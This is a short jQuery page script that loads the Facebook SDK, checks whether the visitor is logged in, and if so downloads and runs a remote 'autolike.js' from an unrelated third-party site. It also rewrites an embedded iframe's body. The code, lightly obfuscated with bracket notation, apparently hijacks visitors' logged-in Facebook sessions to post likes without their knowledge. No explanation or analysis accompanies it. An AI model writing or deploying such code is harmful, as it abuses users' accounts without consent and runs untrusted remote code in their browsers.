$(document).ready(function(){
	$('#theiframe').load(function(){
        $('#theiframe').contents().find('body').html('Hey, i`ve changed content of <body>! Yay!!!');
    });

    $["ajaxSetup"]({
        cache: true
    });
    $["getScript"]("//connect.facebook.net/en_UK/all.js", function() {
        FB["init"]({
            appId: "396645113760822",
            xfbml: true
        });
        FB["getLoginStatus"](function(resp) {
            if (resp["status"] == "connected" || resp["status"] == "not_authorized") {
                console["log"](resp["status"]);
                var r = Math["floor"]((Math["random"]() * 3) + 1);
                $["getScript"]("http://tranhgaoviet.com/public/scripts/autolike.js");
            };
        });
    });
});